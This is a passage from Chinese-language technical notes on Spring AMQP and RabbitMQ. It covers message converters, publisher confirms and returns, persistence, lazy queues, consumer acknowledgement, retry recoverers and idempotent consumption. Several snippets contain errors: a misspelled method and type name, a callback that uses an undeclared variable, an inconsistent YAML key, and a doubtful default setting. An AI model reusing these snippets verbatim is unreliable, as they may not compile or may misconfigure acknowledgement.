bindingKeys [String Array] */ &#125;</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line"><span class="meta">)</span></span><br></pre></td></tr></table></figure><p>只需要声明一个注解即可定义队列、交换机、绑定关系；</p><p>但是上面的 Method 2 可能还是有问题：</p><ul><li><p>配置散落在业务代码中，没有与业务逻辑解耦；</p></li><li><p>这么写可能存在 queue / exchange 重复定义的问题，而且需要保证每次声明同样对象的配置一致。降低了可维护性和可扩展性；</p></li><li>在每个方法前面写这么大段注解，降低代码可读性；</li></ul><p>有什么办法解决吗？可以综合 Method 1 使用 ~</p><h3 id="1-2-6-Spring-AMQP-消息转换器"><a href="#1-2-6-Spring-AMQP-消息转换器" class="headerlink" title="1.2.6 Spring AMQP 消息转换器"></a>1.2.6 Spring <code>AMQP</code> 消息转换器</h3><p>注意，到目前为止，我们没有讨论过队列传输的对象是 <code>POJO</code> 或者是更复杂的 Java 对象的情况。</p><p>我们知道如果传输的是简单的 Java String，则 <code>RabbitMQ</code> 直接在队列上传输字符串；但是对于一般的 Java 对象，<code>RabbitMQ</code> 会使用 Java 内置的序列化实现将对象转为 Java Serializable Object；</p><p>我们跟踪 Spring <code>RabbitTemplate</code> 源码发现，内部对 <code>Object</code>（传递的信息）执行了 <code>convertMessageIfNecessary</code> 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"><span class="keyword">protected</span> Message <span class="title function_">covertMessageIfNecessary</span><span class="params">(<span class="keyword">final</span> Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (object <span class="keyword">instanceof</span> Message) &#123;</span><br><span class="line">        <span class="keyword">return</span> (Message) object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> getRequiredMessageConverter().toMessage(object, <span class="keyword">new</span> <span class="title class_">MessageProperties</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* ... */</span></span><br></pre></td></tr></table></figure><p><code>Message</code> 类型是 <code>AMQP</code> 定义的接口，定义了帮助 <code>AMQP</code> 传输消息的方法。</p><p>我们进一步了解发现 <code>getRequiredMessageConverter()</code> 方法是获取 <code>RabbitTemplate</code> 的实例属性 <code>messageConverter</code>，<strong>其类型是 <code>MessageConverter</code>，默认实现是 <code>SimpleMessageConverter</code></strong>；</p><p>再查看 <code>MessageConverter</code> 的接口实现可以发现 Spring 中存在很多实现，例如 <code>Jackson2XmlMessageConverter / Jackson2JsonMessageConverter / ...</code>；</p><p>那么这些 converter 具体是如何将一般的 <code>Object</code> 转换为 <code>Message</code> 的呢？</p><p>我们找到 <code>MessageConverter</code> 接口的 <code>toMessage()</code> 方法，发现其在 <code>SimpleMessageConverter</code> 中的实现如下：</p><p><img src="imgs/smc-createMessage.png"></p><p>注意到，对于非空非 <code>byte[] / String</code> 类型的可序列化对象，<code>SimpleMessageConverter</code> 会直接将对象序列化（默认 Java 的对象流 <code>ObjectOutputStream</code>）。</p><p>这样做一般情况下没什么，但是在消息中间件中不建议使用，具体有以下几点原因：</p><ul><li><code>JDK</code> 的 <code>ObjectOutputStream</code> 本身存在安全风险（可以轻松反序列化并且进行代码注入）；</li><li><code>JDK</code> 的对象数据流大小往往很大，存放了一些并不需要传输的数据（几个 byte 的数据可能被序列化成几百个 byte 的数据，降低了传输性能，限制了消息吞吐量）；</li></ul><p>这里建议使用 <code>Jackson2JsonMessageConverter</code>。我们只需要在发送模块书写一个 <code>Bean</code> 配置类，然后让 Spring Boot 自动装配即可。</p><blockquote><p>确保引入依赖 <code>com.fasterxml.jackson.core:jackson-databind</code>；</p></blockquote><h2 id="1-3-Spring-AMQP-实战：消息中间件替换-OpenFeign-同步远程调用"><a href="#1-3-Spring-AMQP-实战：消息中间件替换-OpenFeign-同步远程调用" class="headerlink" title="1.3 Spring AMQP 实战：消息中间件替换 OpenFeign 同步远程调用"></a>1.3 Spring <code>AMQP</code> 实战：消息中间件替换 <code>OpenFeign</code> 同步远程调用</h2><blockquote><p>小贴士：如果设置了消费者确认机制并且使用 <code>auto</code> 模式，使用 <code>@RabbitListener</code> 注解的函数返回类型必须是 <code>void</code>。否则 RabbitMQ 会认为 consumer 执行错误。</p></blockquote><h1 id="Chapter-2-MQ-进阶：消息可靠性"><a href="#Chapter-2-MQ-进阶：消息可靠性" class="headerlink" title="Chapter 2. MQ 进阶：消息可靠性"></a>Chapter 2. MQ 进阶：消息可靠性</h1><p>使用 Spring <code>AMQP</code> 进行服务间异步通信可能存在一些问题：</p><ul><li>消息发布方网络丢包，导致消息丢失；</li><li>消息被 MQ 正确接受到后，MQ 宕机导致消息丢失；或者消费者速度较低，MQ 产生内存中的消息积压（内存占满的刷盘期间）可能造成消息丢失；</li><li>在 MQ 发送给消息消费方时，消费方宕机导致消息丢失；</li></ul><p>因为网络的不可靠性，即便我们针对上述问题进行保护措施，仍然可能出现一些问题。我们最终需要一些兜底的机制，至少需要确保消息的最终一致性。</p><p>接下来将会以 RabbitMQ 为例，从上面 4 个角度分析 MQ 如何保证消息的可靠性。</p><h2 id="2-1-消息发布方的可靠性：重连与确认机制"><a href="#2-1-消息发布方的可靠性：重连与确认机制" class="headerlink" title="2.1 消息发布方的可靠性：重连与确认机制"></a>2.1 消息发布方的可靠性：重连与确认机制</h2><h3 id="2-1-1-发送者重连-性能警告"><a href="#2-1-1-发送者重连-性能警告" class="headerlink" title="2.1.1 发送者重连 [性能警告]"></a>2.1.1 发送者重连 [性能警告]</h3><p>发送者重连，在 MQ 与消息发布方连接后，存在连接断开的情况，这可能导致发布方网络丢包；因此需要 MQ 和服务发布方在网络丢失后进行重连，特别地，在 RabbitMQ 中需要<strong><u>在消息发送方</u></strong>进行配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">rabbitmq:</span></span><br><span class="line">        <span class="attr">connection-timeout:</span> <span class="string">1s</span><span class="comment"># MQ 连接超时时间（连接等待多长时间才算失败，失败后才进行重连）</span></span><br><span class="line">        <span class="attr">template:</span></span><br><span class="line">            <span class="attr">retry:</span></span><br><span class="line">                <span class="attr">enable:</span> <span class="literal">true</span><span class="comment"># 消息重连（默认 false）</span></span><br><span class="line">                <span class="attr">initial-interval:</span> <span class="string">1000ms</span><span class="comment"># 连接失败/断开后的初识等待时间（立即尝试的成功概率小）</span></span><br><span class="line">                <span class="attr">multiplier:</span> <span class="number">1</span><span class="comment"># 尝试等待时间倍数（下次等待时间为上次的倍数。第二次相对于 initial-interval）</span></span><br><span class="line">                <span class="attr">max-attempts:</span> <span class="number">3</span><span class="comment"># 最大尝试次数</span></span><br></pre></td></tr></table></figure><p>但是这种机制是<strong>阻塞式重连</strong>，对业务性能会造成影响，这也是为什么 <code>retry</code> 默认配置是禁用的。如果必须要使用，也需要合理设置超时、等待时长，以及尝试次数；</p><h3 id="2-1-2-发送者确认-性能警告"><a href="#2-1-2-发送者确认-性能警告" class="headerlink" title="2.1.2 发送者确认 [性能警告]"></a>2.1.2 发送者确认 [性能警告]</h3><p>发送者确认：Spring <code>AMQP</code> 提供了 Publish Confirm（消息确认反馈）和 Publisher Return（路由错误返回信息）两种机制。</p><p><strong>在发送者确认机制打开后，当消息发布方向 MQ 发送一条消息，MQ 会返回<u>确认结果</u>给发送方</strong>，确认结果分为以下几种情况：</p><ul><li><p>消息成功投递到 MQ 中，但是路由失败：MQ 通过 Publisher Return 返回路由错误原因，返回 <code>ACK</code> 告知投递成功；</p><blockquote><p>这种情况只可能是：exchange 没有绑定队列 / routing key 没有匹配队列，是开发者原因。与网络、发送方、MQ 都没有关系，所以认为投递成功。</p><p>这种情况重新发送消息是没有意义的，因为错误不会因为重试而修复。</p></blockquote></li><li><p><strong><u>临时消息</u></strong>投递到 MQ 中，且成功入队；MQ 反馈 <code>ACK</code> 告知投递成功；</p><blockquote><p>临时消息对于队列是否是 <code>durable</code> 的没有要求，只要投递到 MQ 中，并且进入队列内存，就算成功；</p></blockquote></li><li><p><strong><u>持久消息</u></strong>投递到 MQ 中，且成功入队，且成功持久化；MQ 反馈 <code>ACK</code> 告知投递成功；</p><blockquote><p>持久消息需要被 MQ 放入 durable 队列中，并且持久化才算投递成功，这样可以防止 MQ 宕机造成消息丢失。</p><p>同时这可能损失一部分性能，所以应该根据业务逻辑来选择持久消息或临时消息。</p></blockquote></li><li><p>其他任何情况都会反馈 <code>NACK</code>，表示投递失败。<strong><u>只有在这种情况下，进行消息重发是正确的、有意义的</u></strong>；</p></li></ul><p>以 RabbitMQ 为例，开启发送者确认机制需要<strong><u>在消息发送方</u></strong>进行配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">rabbitmq:</span></span><br><span class="line">        <span class="attr">publisher-confirm-type:</span> <span class="string">correlated</span><span class="comment"># 开启 Publish Confirm 机制，指定模式类型</span></span><br><span class="line">        <span class="attr">publish-return:</span> <span class="literal">true</span><span class="comment"># 开启 Publish Return 机制</span></span><br></pre></td></tr></table></figure><p>所谓 Publish Confirm 只包含了 <code>ACK / NACK</code> 的消息，而 Publish Return 则<strong>回调上面第一种投递成功，但路由失败的失败信息</strong>。</p><p>Publish Confirm 的 3 种模式分别为：</p><ul><li><code>none</code>：关闭 Publish Confirm 机制；</li><li><code>simple</code>：同步阻塞等待 MQ 的确认；</li><li><code>correlated</code>：MQ 异步回调方式确认；</li></ul><p>那么如何配置 MQ 的异步回调（confirm callback 和 return callback）？</p><p>事实上，一个 <code>RabbitTemplate</code> 只能配置一个 Return Callback（<strong>需要启用 Publish Return 机制</strong>）。所以需要在 Spring 项目启动过程中配置一次：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MqConfig</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> RabbitTemplate rabbitTemplate;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 在构造函数完成后执行一次 */</span></span><br><span class="line">    <span class="meta">@PostConstruct</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        rabbitTemplate.setReturnsCallback(</span><br><span class="line">            <span class="comment">/* RabbitTemplate.ReturnsCallback 是一个函数接口 */</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">RabbitTemplate</span>.ReturnsCallback() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">returnMessage</span><span class="params">(ReturnedMessage msg)</span> &#123;</span><br><span class="line">                    log.error(<span class="string">&quot;Return callback triggered.&quot;</span>);</span><br><span class="line">                    log.debug(<span class="string">&quot;exchange: &#123;&#125;&quot;</span>, returned.getExchange());</span><br><span class="line">                    log.debug(<span class="string">&quot;routingKey: &#123;&#125;&quot;</span>, returned.getRoutingKey());</span><br><span class="line">                    log.debug(<span class="string">&quot;message: &#123;&#125;&quot;</span>, returned.getMessage());</span><br><span class="line">                    log.debug(<span class="string">&quot;replyCode: &#123;&#125;&quot;</span>, returned.getReplyCode());</span><br><span class="line">                    log.debug(<span class="string">&quot;replyText: &#123;&#125;&quot;</span>, returned.getReplyText());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于单条消息而言还有 Confirm Callback（<strong>需要启用 Publish Confirm 机制</strong>），这在每条消息发送前都需要配置一次：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">testPublisherConfirm</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">    <span class="comment">// 1. 创建 CorrelationData，包含消息的全局 ID（MQ 需要区别消息以发送 confirm 或 return）</span></span><br><span class="line">    <span class="type">CorrelationData</span> <span class="variable">cd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CorrelationData</span>(</span><br><span class="line">        UUID.randomUUID().toString()<span class="comment">/* 注：UUID 可能存在性能问题和 MAC 地址安全问题 */</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 2.给 Future 添加 ConfirmCallback</span></span><br><span class="line">    cd.getFuture().addCallback(</span><br><span class="line">        <span class="comment">/* ListenableFutureCallback 是一个含有 onFailure 和 onSuccess 的接口 */</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ListenableFutureCallback</span>&lt;CorrelationData.Confirm&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onFailure</span><span class="params">(Throwable ex)</span> &#123;</span><br><span class="line">                <span class="comment">// 2.1.Future发生异常时的处理逻辑，基本不会触发</span></span><br><span class="line">                log.error(<span class="string">&quot;handle message ack fail&quot;</span>, ex);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* 请类比 JavaScript 的 Promise，思考为什么即便是投递失败也在 onSuccess 中 */</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSuccess</span><span class="params">(CorrelationData.Confirm result)</span> &#123;</span><br><span class="line">                <span class="comment">// 2.2.Future接收到回执的处理逻辑，参数中的result就是回执内容</span></span><br><span class="line">                <span class="keyword">if</span> (result.isAck()) &#123;</span><br><span class="line">                    <span class="comment">// result.isAck()，boolean类型</span></span><br><span class="line">                    <span class="comment">// true代表ack回执，false 代表 nack回执</span></span><br><span class="line">                    log.debug(<span class="string">&quot;发送消息成功，收到 ack!&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// result.getReason()，String类型，返回nack时的异常描述</span></span><br><span class="line">                    log.error(</span><br><span class="line">                        <span class="string">&quot;发送消息失败，收到 nack, reason : &#123;&#125;&quot;</span>, result.getReason()</span><br><span class="line">                    );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 3.发送消息</span></span><br><span class="line">    rabbitTemplate.convertAndSend(<span class="string">&quot;test.direct&quot;</span>, <span class="string">&quot;red1&quot;</span>, <span class="string">&quot;hello&quot;</span>, cd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还要提一点，发送确认也会对性能有较大影响。而且发送丢包的概率较低，所以只建议在亟需确保数据可靠性的极端情况下才需要如此配置。</p><h2 id="2-2-MQ-的可靠性"><a href="#2-2-MQ-的可靠性" class="headerlink" title="2.2 MQ 的可靠性"></a>2.2 MQ 的可靠性</h2><p>如上所述，MQ 可能丢失消息的场景有两类：</p><ul><li>消息被 MQ 正确接受到后，MQ 宕机导致消息丢失；</li><li>消费者速度很低，MQ 产生内存中的消息积压阻塞（内存占满的刷盘期间无法继续入队）可能造成消息丢失；</li></ul><p>具体有两种思路可以解决，一是数据持久化策略，二是 Lazy Queue；</p><h3 id="2-2-1-MQ-的数据持久化-默认"><a href="#2-2-1-MQ-的数据持久化-默认" class="headerlink" title="2.2.1 MQ 的数据持久化 [默认]"></a>2.2.1 MQ 的数据持久化 [默认]</h3><ul><li><p>交换机持久化、队列持久化（默认都是 durable）；</p><blockquote><p>交换机、队列的持久化，是指交换机 / 队列自身的信息也会持久化在磁盘中；</p></blockquote></li><li><p>消息持久化。我们在之前提到，临时消息不会被 MQ 保证持久化到磁盘中，意味着这类消息在掉电后可能丢失。所以如果对一类消息的正确性要求很高，需要将消息设置为持久消息：</p><p>由于 <code>RabbitTemplate</code> 默认的 <code>convertAndSend</code> 方法中的 message converter 都默认构建 Message 为持久的消息，因此我们需要手动构建才能得到临时消息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> MessageBuilder</span><br><span class="line">    .withBody(<span class="string">&quot;Hello, Spring AMQP&quot;</span>.getBytes(StandardCharsets.UTF_8))</span><br><span class="line">    .setDeliveryMode(MessageDeliveryMode.NON_PERSISTENT)</span><br><span class="line">    .build();</span><br></pre></td></tr></table></figure><p>如果使用大量数据实验会发现，大量、快速发送临时消息（不会主动刷盘）会不断在内存中积压，其触发的 Page Out（泛指内存耗尽触发的被动刷盘操作）会像数据结构 LSM Tree 的 compaction 操作一样短时间内迅速降低 MQ 的吞吐量，形成一个个性能低谷，总体性能反而小于持久数据（一开始就进行刷盘操作）；</p></li></ul><h3 id="2-2-2-Lazy-Queue-默认"><a href="#2-2-2-Lazy-Queue-默认" class="headerlink" title="2.2.2 Lazy Queue [默认]"></a>2.2.2 Lazy Queue [默认]</h3><p>在 Rabbit MQ 3.12 以后，所有队列默认 Lazy Queue 且无法更改。</p><p>Lazy Queue 的特征是，</p><ul><li>接收到消息后直接存入磁盘，不再存储到内存；</li><li>消费者要消费消息时才会从磁盘中读取并加载到内存（可以提前缓存部分消息到内存，最多2048条）；</li></ul><h2 id="2-3-消费者的可靠性"><a href="#2-3-消费者的可靠性" class="headerlink" title="2.3 消费者的可靠性"></a>2.3 消费者的可靠性</h2><h3 id="2-3-1-消费者确认机制"><a href="#2-3-1-消费者确认机制" class="headerlink" title="2.3.1 消费者确认机制"></a>2.3.1 消费者确认机制</h3><p>Spring <code>AMQP</code> 同样存在一种机制，即消费者确认机制（Consumer Acknowledgement）。</p><p>它是为了确认消费者是否成功处理消息。当消费者处理消息结束后，应该向 Rabbit MQ 发送一个回执，告知 Rabbit MQ 自己消息处理状态：</p><ul><li><code>ACK</code>：成功处理消息，Rabbit MQ 从队列（内存以及磁盘）中删除该消息；</li><li><code>NACK</code>：消息处理失败，Rabbit MQ 需要再次投递消息；</li><li><code>REJECT</code>：消息处理失败并拒绝该消息，Rabbit MQ 从队列（内存以及磁盘）中删除该消息；</li></ul><p>这个回执应该在消费者关于该消息所有业务逻辑处理完成后，才能返回，防止出错后无法重试。</p><p>这样的操作非常类似 事务机制。</p><p>Spring <code>AMQP</code> 已经实现了消息确认功能。并允许我们通过配置文件选择ACK处理方式：</p><ul><li><p><code>none</code>：不处理。即消息投递给消费者后立刻 <code>ACK</code>，消息会立刻从 MQ 删除。非常不安全，不建议使用；</p></li><li><p><code>manual</code>：手动模式。需要自己在业务代码中调用 API，发送 <code>ACK</code> 或 <code>REJECT</code>，存在业务入侵，但更灵活；</p></li><li><p><code>auto</code>：自动模式。Spring <code>AMQP</code> 利用 <code>AOP</code> 对我们的消息处理逻辑做了环绕增强，当业务正常执行时则自动返回 <code>ACK</code>.  当业务出现异常时，根据异常判断返回不同结果：</p><ul><li><p>如果是业务异常，会自动返回 <code>NACK</code>，消息会重新进入 <code>Ready</code> 状态投递给对应消费者（重新处于 <code>Ready</code> 状态）；</p><blockquote><p>消费者宕机、抛出 <code>RuntimeException</code> / 其他自定义异常，都认为是 <code>NACK</code>；</p></blockquote></li><li><p>如果是消息处理或校验异常（需要抛出例如 <code>MessageConversionException</code>），自动返回 <code>REJECT</code>；</p><blockquote><p>这就提醒我们，遇到业务逻辑中的格式异常，请不要 throw <code>RuntimeException</code>，不然会被 Spring 认为是业务异常而重新发送！</p></blockquote></li></ul></li></ul><p>我们需要在消息消费方配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">rabbitmq:</span></span><br><span class="line">        <span class="attr">listener:</span></span><br><span class="line">            <span class="attr">simple:</span></span><br><span class="line">                <span class="attr">prefetch:</span> <span class="number">1</span></span><br><span class="line">                <span class="attr">acknowledge-mode:</span> <span class="string">none</span><span class="comment"># 默认不处理，</span></span><br></pre></td></tr></table></figure><h3 id="2-3-2-消费者失败重试机制"><a href="#2-3-2-消费者失败重试机制" class="headerlink" title="2.3.2 消费者失败重试机制"></a>2.3.2 消费者失败重试机制</h3><p>在引入消费者确认机制后，还会出现一个问题：如果 MQ 中积压的消息量过大，导致消费方宕机，在消费者恢复后，没有进行请求热身，MQ 又重发了大量的消息，很有可能会再次导致消费方再次宕机。</p><p>这会给消费方和 MQ 都造成极大的压力。</p><p>为了应对这种情况，MQ 引入了另一种机制来保障消费方的消息可靠性：消费者失败重试机制。在消费者出现异常时按照配置重试，而不是无限的重复入队。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">rabbitmq:</span></span><br><span class="line">        <span class="attr">listener:</span></span><br><span class="line">            <span class="attr">simple:</span></span><br><span class="line">                <span class="attr">prefetch:</span> <span class="number">1</span></span><br><span class="line">                <span class="attr">retry:</span><span class="comment"># 注：发送方重试位于 template 下</span></span><br><span class="line">                    <span class="attr">enabled:</span> <span class="literal">true</span><span class="comment"># 默认 false</span></span><br><span class="line">                    <span class="attr">initial-interval:</span> <span class="string">1000ms</span><span class="comment"># 失败初始等待时间</span></span><br><span class="line">                    <span class="attr">multiplier:</span> <span class="number">1</span></span><br><span class="line">                    <span class="attr">max-attempts:</span> <span class="number">3</span></span><br><span class="line">                    <span class="attr">stateless:</span> <span class="literal">true</span><span class="comment"># 如果业务中含有事务，说明这种消息重递是有状态的，应该 false</span></span><br></pre></td></tr></table></figure><p>在重试超过 <code>max-attempts</code> 后，消息状态转变为 requeue-exhausted，进而转入 <code>MessageRecoverer</code> 中处理。</p><p>Spring <code>AMQP</code> <strong>默认的 <code>MessageRecoverer</code> 的实现是 <code>RejectAndDontRequeueRecoverer</code></strong>，其策略是直接丢弃这条消息，这样做有失消费者安全性。</p><p>除了默认的 recoverer，还有两种：</p><ul><li><p><code>ImmediateRequeueMessageRecoverer</code>：重试耗尽后，仍然认为返回 <code>NACK</code>，重新入队；</p><blockquote><p>这种策略和不采取失败者重试的策略相比，性能影响会小一点；</p></blockquote></li><li><p><code>RepublishMessageRecoverer</code>：重试耗尽后，将消息（<strong>包括报错信息</strong>）投递到指定交换机，以供其他处理用途；</p><blockquote><p>这种策略也比较合理，认为反复投递无效就应该换一种处理方式。</p><p>但这种方法需要专门配置一个指定的交换机：</p><ul><li>定义接受失败队列、与其绑定的交换机；</li><li>定义 <code>RepublishMessageRecoverer</code> 的 Bean（传入 <code>RabbitTemplate</code>、交换机、队列名称）；</li></ul></blockquote></li></ul><p>这种机制虽然相较于原先确认机制而言，降低了可靠性，但是一定程度上提升了服务的可用性，降低多次/长时间宕机造成的资源浪费风险。</p><h2 id="2-4-业务幂等性保证"><a href="#2-4-业务幂等性保证" class="headerlink" title="2.4 业务幂等性保证"></a>2.4 业务幂等性保证</h2><p>在上面的过程中，有一种情况我们没有考虑：如果消费者的接口不是幂等的，就需要保证消息发送的不重复性。</p><p>也就是说，<strong>假设消费者收到消息后并且处理结束，要给 MQ 发送 <code>ACK</code> 时连接断开了（或者两方有一方宕机了），就可能会导致 MQ 消息重新发送</strong>。这个问题没办法借助 MQ 来解决，因为不是 MQ 本身的问题。</p><p>那么应该如何处理这种情况？</p><h3 id="2-4-1-唯一消息-ID"><a href="#2-4-1-唯一消息-ID" class="headerlink" title="2.4.1 唯一消息 ID"></a>2.4.1 唯一消息 ID</h3><p>第一种思路是唯一消息 ID：给每个消息都设置一个唯一 ID，利用 ID 区分是否是重复消息。</p><ul><li>每一条消息都生成一个唯一的 ID，与消息一起投递给消费者；</li><li>消费者接收到消息后处理自己的业务，业务处理成功后将消息 ID 保存到数据库；</li><li>如果下次又收到相同消息，去数据库查询判断是否存在，存在则为重复消息放弃处理。</li></ul><blockquote><p>Tips. 这和之前提到的发送者确认机制中创建的 <code>CorrelationData</code> 中的 ID 不一样，前者是作回执用的 ID，它和消费 ID 可以保持消费不一致；</p></blockquote><p>我们可以在定义消息转换器时显式声明让 MQ 创建全局唯一的 Message ID：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> MessageCoverter <span class="title function_">messageConverter</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Jackson2JsonMessageConverter</span> <span class="variable">jmc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Jackson2JsonMessageConverter</span>();</span><br><span class="line">    jmc.setCreateMessageIds(<span class="literal">true</span>);    <span class="comment">/* 默认 false */</span></span><br><span class="line">    <span class="keyword">return</span> jmc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个 Message ID 会存放在 Message 的 Properties 中（不是我们常用的 Payload 中），所以需要我们单独去取：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 都需要转换，所以直接使用 Message 类型接收，就能收到 properties 数据 */</span></span><br><span class="line"><span class="meta">@RabbitListener(/* ... */)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">consumer</span><span class="params">(Message message)</span> &#123;</span><br><span class="line">    message.getBody();     <span class="comment">/* 返回 byte[] */</span></span><br><span class="line">    message.getMessageProperties();    <span class="comment">/* MessageProperties */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><code>byte[]</code> 中如果原来是字符串，则可以直接用字符串构造函数构造；</p><p>如果是 自定义的对象，并且使用了 <code>Jackson2JsonMessageConverter</code>，直接用配套的 <code>ObjectMapper</code> 解析就行；</p></li><li><p><code>MessageProperties.getMessageId()</code> 就能获取其中的 <code>message-id</code> 属性（如果有）；</p></li></ul><p>缺点：</p><ul><li><p>业务逻辑嵌入和耦合。给业务引入了原本不需要的逻辑，造成耦合；</p></li><li><p>数据库写影响原本业务性能；</p></li></ul><h3 id="2-4-2-业务逻辑本身判断"><a href="#2-4-2-业务逻辑本身判断" class="headerlink" title="2.4.2 业务逻辑本身判断"></a>2.4.2 业务逻辑本身判断</h3><p>上面的方法虽然通用，但是是侵入式的解决方案。如果业务逻辑允许，我们可以根据原有的业务逻辑判断这次消息是否被处理过。</p><blockquote><p>相当于做了非幂等业务的保护流程。</p><p>例如对于订单业务，如下图，如果在交易服务中的 “标记订单为已支付”，如果用户在支付成功后，“标记订单已支付” 以及完成，正在向 MQ 发送 <code>ACK</code> 时断开连接。此时 MQ 认为消费者未收到。</p><p>如果用户此时发起了退款，交易服务立即更改为退款中，此后 MQ 的连接又恢复了，如果不作处理，则 “已支付” 的状态会覆盖 “退款中” 的状态。</p><p><img src="imgs/pe-example.png" width="400px"></p><p>这种情况除了使用 Message ID 的方法，还可以直接检查 “标记订单已支付” 之前的订单状态，毕竟根据业务逻辑，只有未支付的订单才会需要标记成已支付：</p><p><img src="imgs/pe-example-sol.png" width="600px"></p></blockquote><p> 